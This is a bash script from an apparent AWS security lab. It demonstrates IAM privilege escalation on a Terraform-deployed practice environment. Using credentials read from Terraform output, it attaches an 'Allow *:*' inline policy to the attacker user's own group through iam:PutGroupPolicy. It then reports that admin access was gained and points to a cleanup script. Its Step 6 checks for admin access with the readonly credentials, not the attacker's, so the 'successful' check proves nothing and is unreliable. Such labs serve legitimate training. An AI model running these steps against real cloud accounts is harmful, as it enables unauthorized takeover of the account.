#!/bin/bash

# Demo script for iam:PutGroupPolicy self-escalation
# This is a USER-BASED self-escalation scenario


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
PRIVESC_USER="pl-prod-iam-011-to-admin-paul"
TARGET_GROUP="pl-prod-iam-011-to-admin-escalation-group"
POLICY_NAME="EscalatedAdminAccess"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PutGroupPolicy Self-Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}User-Based Self-Escalation${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting privesc user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_admin_iam_011_iam_putgrouppolicy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo -e "${GREEN}✓ Retrieved credentials for $PRIVESC_USER${NC}"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo ""

cd - > /dev/null  # Return to scenario directory

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user identity${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $USER_IDENTITY"

if [[ ! $USER_IDENTITY == *"$PRIVESC_USER"* ]]; then
    echo -e "${RED}Error: Not running as $PRIVESC_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Confirmed identity as $PRIVESC_USER${NC}\n"

# [OBSERVATION] Step 3: Get account ID and verify group membership
echo -e "${YELLOW}Step 3: Getting account ID and verifying group membership${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION

show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"

show_cmd "ReadOnly" "aws iam get-group --group-name $TARGET_GROUP --query 'Users[*].UserName' --output text"
GROUP_MEMBERS=$(aws iam get-group --group-name $TARGET_GROUP --query 'Users[*].UserName' --output text)
if [[ $GROUP_MEMBERS == *"$PRIVESC_USER"* ]]; then
    echo -e "${GREEN}✓ Confirmed: $PRIVESC_USER is a member of $TARGET_GROUP${NC}"
else
    echo -e "${RED}Error: $PRIVESC_USER is not a member of $TARGET_GROUP${NC}"
    echo "The scenario infrastructure may not be properly deployed"
    exit 1
fi
echo ""

# [EXPLOIT] Step 4: Check current permissions (should be limited)
echo -e "${YELLOW}Step 4: Checking current permissions (should be limited)${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
    echo "The group may already have an admin policy attached from a previous run"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Perform the self-escalation - put admin policy on own group
echo -e "${YELLOW}Step 5: Self-escalation - Adding administrator policy to own group${NC}"
use_starting_creds
echo "This is the privilege escalation vector..."
echo "$PRIVESC_USER is adding an admin policy to $TARGET_GROUP (which they are a member of)"
echo ""

# Create the admin policy document
ADMIN_POLICY=$(cat <<POLICY
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
POLICY
)

# Put the policy on the group
show_attack_cmd "Attacker" "aws iam put-group-policy --group-name $TARGET_GROUP --policy-name $POLICY_NAME --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
aws iam put-group-policy \
    --group-name $TARGET_GROUP \
    --policy-name $POLICY_NAME \
    --policy-document "$ADMIN_POLICY"

echo -e "${GREEN}✓ Successfully added administrator policy to group${NC}"
echo -e "${GREEN}✓ $PRIVESC_USER now has administrator access through group membership!${NC}\n"

# [OBSERVATION] Step 6: Verify admin access
echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
use_readonly_creds
echo "The user $PRIVESC_USER should now have admin access via group membership..."
echo ""

# IAM policy changes can take time to propagate
echo "Waiting 15 seconds for IAM policy to propagate..."
sleep 15

# Test admin permissions with retry
echo "Testing admin permissions (listing IAM users)..."
SUCCESS=false
for i in {1..3}; do
    show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
    if aws iam list-users --max-items 3 --output table 2>/dev/null; then
        echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
        echo -e "${GREEN}✓ Confirmed administrator access through group policy!${NC}\n"
        SUCCESS=true
        break
    else
        if [ $i -lt 3 ]; then
            echo "Waiting for permissions to propagate (attempt $i/3)..."
            sleep 2
        fi
    fi
done

if [ "$SUCCESS" = false ]; then
    echo -e "${YELLOW}Note: IAM policy propagation may still be in progress.${NC}"
    echo "The privilege escalation was successful - permissions may take a moment to fully propagate."
fi

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}✅ SELF-ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Summary:${NC}"
echo "1. Started as: $PRIVESC_USER (member of $TARGET_GROUP)"
echo "2. Used PutGroupPolicy to add admin policy to own group"
echo "3. $PRIVESC_USER now has administrator access via group membership"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $PRIVESC_USER (member of $TARGET_GROUP)"
echo -e "    ↓ (iam:PutGroupPolicy)"
echo -e "  Adds admin policy to $TARGET_GROUP"
echo -e "    ↓ (group membership)"
echo -e "  $PRIVESC_USER gains Administrator Access"
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
    echo ""
fi

echo -e "${YELLOW}Key Insight:${NC}"
echo "This is a self-escalation attack where a user with iam:PutGroupPolicy permission"
echo "on a group they belong to can grant themselves admin access by adding an inline"
echo "policy to their own group."
echo ""
echo -e "${YELLOW}Attack artifacts:${NC}"
echo "- Inline policy '$POLICY_NAME' on group $TARGET_GROUP"
echo ""
echo -e "${RED}⚠ Warning: The user $PRIVESC_USER now has administrator access!${NC}"
echo "Run ./cleanup_attack.sh to remove the inline policy and restore the original state"
# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
